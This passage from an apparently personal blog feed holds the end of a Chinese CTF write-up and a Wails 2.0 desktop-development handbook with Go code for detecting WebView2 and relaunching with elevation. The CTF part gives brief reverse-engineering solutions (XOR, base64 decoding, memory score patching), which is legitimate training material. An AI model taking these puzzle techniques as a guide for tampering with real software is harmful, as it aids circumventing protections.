——&gt; 拿走!一步到位</p><blockquote><p>九龙吐水</p></blockquote><p>PWN 题真的水吧可能,有且只有一题,队里web手写的</p><p><img src="https://gitee.com/eviden/img/raw/master/202407251633494.png" alt="img"></p><p><img src="https://gitee.com/eviden/img/raw/master/202407251633560.jpg" alt="img"></p><blockquote><p>葛仙炼丹</p></blockquote><p><strong>Mobile</strong></p><p><img src="https://gitee.com/eviden/img/raw/master/202407251637841.png" alt="image-20240725163741783"></p><p><img src="https://gitee.com/eviden/img/raw/master/202407251637296.png" alt="image-20240725163759224"></p><p>Apk文件，用jeb打开，搜关键字符串flag，看到checkflag函数，关注到下面有个xor,和两堆字符串，将他们异或输出为字符就得到flag了</p><p><img src="https://gitee.com/eviden/img/raw/master/202407251638213.png" alt="image-20240725163809147"></p><p><img src="https://gitee.com/eviden/img/raw/master/202407251638191.png" alt="image-20240725163817127"></p><blockquote><p>星空栈道</p></blockquote><p><strong>MISC</strong></p><p>首先打开，发现文件叫base.txt，然后立刻想到了base转图片，转了之后，发现图片损坏打不开，然后用010打开，发现其为elf文件，把后缀改成elf，用ida64打开</p><p><img src="https://gitee.com/eviden/img/raw/master/202407251640785.png" alt="image-20240725164026673"></p><p>发现循环异或就欧克了</p><blockquote><p>九龙吐水</p></blockquote><p><img src="https://gitee.com/eviden/img/raw/master/202407251640049.png" alt="image-20240725164048961"></p><p>先得10分找到，计分的地址，将分数修改为10000000</p><p><img src="https://gitee.com/eviden/img/raw/master/202407251641343.png" alt="image-20240725164101191"></p><blockquote><p>花炮故里</p></blockquote><p>打开txt,根据提示python可知，文件为python字节码，大致意思就是，输入flag,存到flaglist里面，然后对比flaglist的长度和已知数组ress的长度，不一样就退出，然后判断flaglist里的数加3，然后异或152是不是等于ress，如果等于就输出success，解密只要将ress里的数异或152，再减3即可</p><p><img src="https://gitee.com/eviden/img/raw/master/202407251641553.png" alt="image-20240725164139491"></p><p><img src="https://gitee.com/eviden/img/raw/master/202407251641379.png" alt="image-20240725164157302"></p><blockquote><p>龙鳞石阶</p></blockquote><p>打开流量包，找到dns部分，看到一些base+……的字符串，猜测为base64解密，试了一下，用最后几个可以解出flag</p><p><img src="https://gitee.com/eviden/img/raw/master/202407251642075.png" alt="image-20240725164216963"></p><blockquote><p>金顶绝境</p></blockquote><p>首先查壳，发现64无壳</p><p>发现一堆字符串和base64码表</p><p><img src="https://gitee.com/eviden/img/raw/master/202407251642798.png" alt="image-20240725164248724"></p><p>猜测为base64加密</p><p>转为字符串发现为Zmxh开头,更加肯定了猜想</p><p><img src="https://gitee.com/eviden/img/raw/master/202407251643763.png" alt="image-20240725164302689"></p><p>Base64解码得到flag</p><blockquote><p>铁蹄关隘</p></blockquote><p><strong>道具题</strong></p><p><img src="https://gitee.com/eviden/img/raw/master/202407251704502.png" alt="image-20240725170452378"></p><p><img src="https://gitee.com/eviden/img/raw/master/202407251705771.png" alt="img"></p>]]></content>
    
    
    <summary type="html">初赛半天,还是很有意思的!</summary>
    
    
    
    <category term="CTF" scheme="https://github.com/Eviden0/new-webpage/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>wails开发小手册</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/ada0a751.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/ada0a751.html</id>
    <published>2024-07-21T23:49:00.000Z</published>
    <updated>2024-07-21T23:42:30.015Z</updated>
    
    <content type="html"><![CDATA[<h1 id="wails-related-本文档仅涉及Windows系统，wails-2-0"><a href="#wails-related-本文档仅涉及Windows系统，wails-2-0" class="headerlink" title="wails-related (本文档仅涉及Windows系统，wails 2.0)"></a>wails-related (本文档仅涉及Windows系统，wails 2.0)</h1><pre><code> 安装命令：go install github.com/wailsapp/wails/v2/cmd/wails@latest</code></pre><h2 id="1-关于webview2"><a href="#1-关于webview2" class="headerlink" title="1. 关于webview2"></a>1. 关于webview2</h2><ul><li><p>WebView2是什么</p><p>  是微软开发的Windows系统的一个控件，方便使用HTML+CSS+JS进行本地桌面应用程序开发。</p></li><li><p>安装</p><p>  Windows 7,8,10 默认是未安装的，windows 11默认是安装的。</p><blockquote><blockquote><p>检测WebView2是否安装：</p></blockquote></blockquote><pre><code>  64位程序检查：SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\&#123;F3017226-FE2A-4295-8BDF-00C3A9A7E4C5&#125;，  32位程序检查：SOFTWARE\Microsoft\EdgeUpdate\Clients\&#123;F3017226-FE2A-4295-8BDF-00C3A9A7E4C5&#125;，  如果上述键值不存在，就是未安装，如果存在，下面代码判断是否安装并获取版本信息（摘自webview2runtime）：</code></pre></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Info contains all the information about an installation of the webview2 runtime.</span></span><br><span class="line"><span class="keyword">type</span> Info <span class="keyword">struct</span> &#123;</span><br><span class="line">    Location        <span class="type">string</span></span><br><span class="line">    Name            <span class="type">string</span></span><br><span class="line">    Version         <span class="type">string</span></span><br><span class="line">    SilentUninstall <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetInstalledVersion returns the installed version of the webview2 runtime.</span></span><br><span class="line"><span class="comment">// If there is no version installed, a blank string is returned.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetInstalledVersion</span><span class="params">()</span></span> *Info &#123;</span><br><span class="line">    <span class="keyword">var</span> regkey = <span class="string">`SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\&#123;F3017226-FE2A-4295-8BDF-00C3A9A7E4C5&#125;`</span></span><br><span class="line">    <span class="keyword">if</span> runtime.GOARCH == <span class="string">&quot;386&quot;</span> &#123;</span><br><span class="line">        regkey = <span class="string">`SOFTWARE\Microsoft\EdgeUpdate\Clients\&#123;F3017226-FE2A-4295-8BDF-00C3A9A7E4C5&#125;`</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    k, err := registry.OpenKey(registry.LOCAL_MACHINE, regkey, registry.QUERY_VALUE)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="comment">// Cannot open key = not installed</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info := &amp;Info&#123;&#125;</span><br><span class="line">    info.Location = getKeyValue(k, <span class="string">&quot;location&quot;</span>)</span><br><span class="line">    info.Name = getKeyValue(k, <span class="string">&quot;name&quot;</span>)</span><br><span class="line">    info.Version = getKeyValue(k, <span class="string">&quot;pv&quot;</span>)</span><br><span class="line">    info.SilentUninstall = getKeyValue(k, <span class="string">&quot;SilentUninstall&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><blockquote><p>下载地址：</p></blockquote></blockquote><pre><code>https://go.microsoft.com/fwlink/p/?LinkId=2124703下载后保存为：MicrosoftEdgeWebview2Setup.exe</code></pre><blockquote><blockquote><p>权限问题：</p></blockquote></blockquote><pre><code>安装需要管理员权限，Wails使用了github.com/leaanthony/webview2runtime包，但非管理员用户安装不会成功，需要对这个包进行改造，下面的例子通过runas重启自己从而获得了管理员权限：</code></pre><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">&quot;fmt&quot;</span></span><br><span class="line">  <span class="string">&quot;os&quot;</span></span><br><span class="line">  <span class="string">&quot;strings&quot;</span></span><br><span class="line">  <span class="string">&quot;syscall&quot;</span></span><br><span class="line">  <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;golang.org/x/sys/windows&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="comment">// if not elevated, relaunch by shellexecute with runas verb set</span></span><br><span class="line">  <span class="keyword">if</span> !amAdmin() &#123;</span><br><span class="line">    runMeElevated()</span><br><span class="line">  &#125;</span><br><span class="line">  time.Sleep(<span class="number">10</span> * time.Second)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runMeElevated</span><span class="params">()</span></span> &#123;</span><br><span class="line">    verb := <span class="string">&quot;runas&quot;</span></span><br><span class="line">    exe, _ := os.Executable()</span><br><span class="line">    cwd, _ := os.Getwd()</span><br><span class="line">    args := strings.Join(os.Args[<span class="number">1</span>:], <span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line">    verbPtr, _ := syscall.UTF16PtrFromString(verb)</span><br><span class="line">    exePtr, _ := syscall.UTF16PtrFromString(exe)</span><br><span class="line">    cwdPtr, _ := syscall.UTF16PtrFromString(cwd)</span><br><span class="line">    argPtr, _ := syscall.UTF16PtrFromString(args)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> showCmd <span class="type">int32</span> = <span class="number">1</span> <span class="comment">//SW_NORMAL</span></span><br><span class="line"></span><br><span class="line">    err := windows.ShellExecute(<span class="number">0</span>, verbPtr, exePtr, argPtr, cwdPtr, showCmd)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">amAdmin</span><span class="params">()</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    _, err := os.Open(<span class="string">&quot;\\\\.\\PHYSICALDRIVE0&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;admin no&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;admin yes&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><blockquote><p>编译好的Wails应用程序可以在启动时检测WebView2是否安装，如果未安装，在用户同意的情况下可自动完成下载安装（非管理员用户安装不会成功，但程序可正常启动运行，下次启动还会提示安装），并正常启动程序。</p></blockquote></blockquote><h2 id="2-手动编译dev版本"><a href="#2-手动编译dev版本" class="headerlink" title="2. 手动编译dev版本"></a>2. 手动编译dev版本</h2><pre><code> go build -tags dev -gcflags &quot;all=-N -l&quot; 上述命令在项目根目录下生成一个changeme.exe，可运行，并且有控制台输出，鼠标右键有调试菜单，可以呼出DevTools。</code></pre><h2 id="3-前后端双向通讯"><a href="#3-前后端双向通讯" class="headerlink" title="3. 前后端双向通讯"></a>3. 前后端双向通讯</h2><pre><code> 演示项目：https://github.com/fire988/wails-demo-01.git</code></pre><h2 id="4-如何启动浏览器调试（不建议，建议使用手动编译dev版本）"><a href="#4-如何启动浏览器调试（不建议，建议使用手动编译dev版本）" class="headerlink" title="4. 如何启动浏览器调试（不建议，建议使用手动编译dev版本）"></a>4. 如何启动浏览器调试（不建议，建议使用手动编译dev版本）</h2><pre><code> 命令：wails dev -browser</code></pre><h2 id="5-如何调试后端golang代码"><a href="#5-如何调试后端golang代码" class="headerlink" title="5. 如何调试后端golang代码"></a>5. 如何调试后端golang代码</h2><pre><code>初始化项目的时候，命令行要加上 -ide 选项，如下：wails init -ide vscode -n testproj然后，就可以在vscode里愉快地调试了。注意：ide目前只能指定为vscode，GoLand还不支持。</code></pre><h2 id="6-初始化一个React项目"><a href="#6-初始化一个React项目" class="headerlink" title="6. 初始化一个React项目"></a>6. 初始化一个React项目</h2><pre><code>两个模板可选（推荐第一个）：wails init -n &quot;your-project-name&quot; -t https://github.com/flin7/wails-react-templatewails init -n &quot;your-project-name&quot; -t https://github.com/kamilikamil/wails-react-template</code></pre><h2 id="7-Win7下不能运行的问题"><a href="#7-Win7下不能运行的问题" class="headerlink" title="7. Win7下不能运行的问题"></a>7. Win7下不能运行的问题</h2><pre><code>wails项目之所以在win7下不能运行，主要是有两个原因造成：1、wails项目编译的程序在启动的时候会检查WebView2的安装情况，如果未安装，会提示并可进行安装，但其检查的注册表项在win7下是不存在的。2、wails项目程序会使用微软的Shcore库，这个库在win7下是没有的，因此无法运行，但其只调用了这个库的一个API，因此，如果写个同名的shcore.dll文件，导出这个函数，就可以解决运行的问题了。FakeShcore项目地址：https://github.com/fire988/FakeShcore.git针对第一个原因，如果已经安装了WebView2，需要修正注册表项（实际上是增加），代码：</code></pre><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">&quot;fmt&quot;</span></span><br><span class="line">  <span class="string">&quot;os&quot;</span></span><br><span class="line">  <span class="string">&quot;runtime&quot;</span></span><br><span class="line">  <span class="string">&quot;strings&quot;</span></span><br><span class="line">  <span class="string">&quot;syscall&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;golang.org/x/sys/windows&quot;</span></span><br><span class="line">  <span class="string">&quot;golang.org/x/sys/windows/registry&quot;</span></span><br><span class="line">  ffmt <span class="string">&quot;gopkg.in/ffmt.v1&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Info contains all the information about an installation of the webview2 runtime.</span></span><br><span class="line"><span class="keyword">type</span> Info <span class="keyword">struct</span> &#123;</span><br><span class="line">  Location        <span class="type">string</span></span><br><span class="line">  Name            <span class="type">string</span></span><br><span class="line">  Version         <span class="type">string</span></span><br><span class="line">  SilentUninstall <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getKeyValue</span><span class="params">(k registry.Key, name <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">  result, _, _ := k.GetStringValue(name)</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetInstalledVersion returns the installed version of the webview2 runtime.</span></span><br><span class="line"><span class="comment">// If there is no version installed, a blank string is returned.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetInstalledVersion</span><span class="params">()</span></span> (*Info, <span class="type">bool</span>) &#123;</span><br><span class="line">  bInCurrUser := <span class="literal">false</span></span><br><span class="line">  <span class="keyword">var</span> regkey1 = <span class="string">`SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\&#123;F3017226-FE2A-4295-8BDF-00C3A9A7E4C5&#125;`</span></span><br><span class="line">  <span class="keyword">var</span> regkey2 = <span class="string">`SOFTWARE\Microsoft\EdgeUpdate\Clients\&#123;F3017226-FE2A-4295-8BDF-00C3A9A7E4C5&#125;`</span></span><br><span class="line">  </span><br><span class="line">  k, err := registry.OpenKey(registry.CURRENT_USER, regkey2, registry.QUERY_VALUE)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> runtime.GOARCH == <span class="string">&quot;386&quot;</span> &#123;</span><br><span class="line">      k, err = registry.OpenKey(registry.LOCAL_MACHINE, regkey2, registry.QUERY_VALUE)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      k, err = registry.OpenKey(registry.LOCAL_MACHINE, regkey1, registry.QUERY_VALUE)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, bInCurrUser</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    bInCurrUser = <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  info := &amp;Info&#123;&#125;</span><br><span class="line">  info.Location = getKeyValue(k, <span class="string">&quot;location&quot;</span>)</span><br><span class="line">  info.Name = getKeyValue(k, <span class="string">&quot;name&quot;</span>)</span><br><span class="line">  info.Version = getKeyValue(k, <span class="string">&quot;pv&quot;</span>)</span><br><span class="line">  info.SilentUninstall = getKeyValue(k, <span class="string">&quot;SilentUninstall&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> info, bInCurrUser</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isAdmin</span><span class="params">()</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">  _, err := os.Open(<span class="string">&quot;\\\\.\\PHYSICALDRIVE0&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;not admin&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">  fmt.Println(<span class="string">&quot;admin yes!&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runMeElevated</span><span class="params">()</span></span> &#123;</span><br><span class="line">  verb := <span class="string">&quot;runas&quot;</span></span><br><span class="line">  exe, _ := os.Executable()</span><br><span class="line">  cwd, _ := os.Getwd()</span><br><span class="line">  args := strings.Join(os.Args[<span class="number">1</span>:], <span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line">  verbPtr, _ := syscall.UTF16PtrFromString(verb)</span><br><span class="line">  exePtr, _ := syscall.UTF16PtrFromString(exe)</span><br><span class="line">  cwdPtr, _ := syscall.UTF16PtrFromString(cwd)</span><br><span class="line">  argPtr, _ := syscall.UTF16PtrFromString(args)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> showCmd <span class="type">int32</span> = <span class="number">1</span> <span class="comment">//SW_NORMAL</span></span><br><span class="line"></span><br><span class="line">  err := windows.ShellExecute(<span class="number">0</span>, verbPtr, exePtr, argPtr, cwdPtr, showCmd)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">if</span> !isAdmin() &#123;</span><br><span class="line">    runMeElevated()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  info, bInCurrUser := GetInstalledVersion()</span><br><span class="line">  <span class="keyword">if</span> info == <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;error getting WebView2 version info.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ffmt.Puts(info)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> bInCurrUser &#123;</span><br><span class="line">    key, exists, _ := registry.CreateKey(registry.LOCAL_MACHINE, <span class="string">`SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\&#123;F3017226-FE2A-4295-8BDF-00C3A9A7E4C5&#125;`</span>, registry.ALL_ACCESS)</span><br><span class="line">    <span class="keyword">defer</span> key.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断是否已经存在了</span></span><br><span class="line">    <span class="keyword">if</span> exists &#123;</span><br><span class="line">      <span class="built_in">println</span>(<span class="string">`键已存在`</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">println</span>(<span class="string">`新建注册表键`</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key.SetStringValue(<span class="string">`location`</span>, info.Location)</span><br><span class="line">    key.SetStringValue(<span class="string">`name`</span>, info.Name)</span><br><span class="line">    key.SetStringValue(<span class="string">`pv`</span>, info.Version)</span><br><span class="line">    key.SetStringValue(<span class="string">`SilentUninstall`</span>, info.SilentUninstall)</span><br><span class="line">    fmt.Println(<span class="string">&quot;创建完成&quot;</span>)</span><br><span class="line">  &#125;   <span class="keyword">else</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;不需要创建&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="8-窗口不能用鼠标调整大小的问题"><a href="#8-窗口不能用鼠标调整大小的问题" class="headerlink" title="8. 窗口不能用鼠标调整大小的问题"></a>8. 窗口不能用鼠标调整大小的问题</h2><pre><code>勉强的解决方案：不要使用窗口标题，代码如下：</code></pre><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// Create an instance of the app structure</span></span><br><span class="line">app := NewApp()</span><br><span class="line"><span class="comment">// Create application with options</span></span><br><span class="line">err := wails.Run(&amp;options.App&#123;</span><br><span class="line">Title:             <span class="string">&quot;wails-t1&quot;</span>,</span><br><span class="line">Width:             <span class="number">720</span>,</span><br><span class="line">Height:            <span class="number">570</span>,</span><br><span class="line">MinWidth:          <span class="number">720</span>,</span><br><span class="line">MinHeight:         <span class="number">570</span>,</span><br><span class="line">MaxWidth:          <span class="number">1920</span>,</span><br><span class="line">MaxHeight:         <span class="number">1080</span>,</span><br><span class="line">DisableResize:     <span class="literal">false</span>,</span><br><span class="line">Fullscreen:        <span class="literal">false</span>,</span><br><span class="line">Frameless:         <span class="literal">true</span>,</span><br><span class="line">StartHidden:       <span class="literal">false</span>,</span><br><span class="line">HideWindowOnClose: <span class="literal">false</span>,</span><br><span class="line">RGBA:              &amp;options.RGBA&#123;R: <span class="number">33</span>, G: <span class="number">37</span>, B: <span class="number">43</span>, A: <span class="number">255</span>&#125;,</span><br><span class="line">Assets:            assets,</span><br><span class="line">LogLevel:          logger.DEBUG,</span><br><span class="line">OnStartup:         app.startup,</span><br><span class="line">OnDomReady:        app.domReady,</span><br><span class="line">OnShutdown:        app.shutdown,</span><br><span class="line">Bind: []<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line">app,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// Windows platform specific options</span></span><br><span class="line">Windows: &amp;windows.Options&#123;</span><br><span class="line">WebviewIsTransparent:  <span class="literal">false</span>,</span><br><span class="line">WindowIsTranslucent:   <span class="literal">false</span>,</span><br><span class="line">DisableWindowIcon:     <span class="literal">false</span>,</span><br><span class="line">EnableFramelessBorder: <span class="literal">true</span>,</span><br><span class="line">&#125;,</span><br><span class="line">Mac: &amp;mac.Options&#123;</span><br><span class="line">TitleBar:             mac.TitleBarHiddenInset(),</span><br><span class="line">WebviewIsTransparent: <span class="literal">true</span>,</span><br><span class="line">WindowIsTranslucent:  <span class="literal">true</span>,</span><br><span class="line">About: &amp;mac.AboutInfo&#123;</span><br><span class="line">Title:   <span class="string">&quot;Vanilla Template&quot;</span>,</span><br><span class="line">Message: <span class="string">&quot;Part of the Wails projects&quot;</span>,</span><br><span class="line">Icon:    icon,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">wails 2.0 开发小文档~(just for windows)</summary>
    
    
    
    <category term="Go" scheme="https://github.com/Eviden0/new-webpage/categories/Go/"/>
    
    
    <category term="GUI" scheme="https://github.com/Eviden0/new-webpage/tags/GUI/"/>
    
  </entry>
  
  <entry>
    <title>fofa查询语法</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/e2a5fe45.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/e2a5fe45.html</id>
    <published>2024-07-08T09:35:00.000Z</published>
    <updated>2024-07-08T10:05:42.144Z</updated>
    
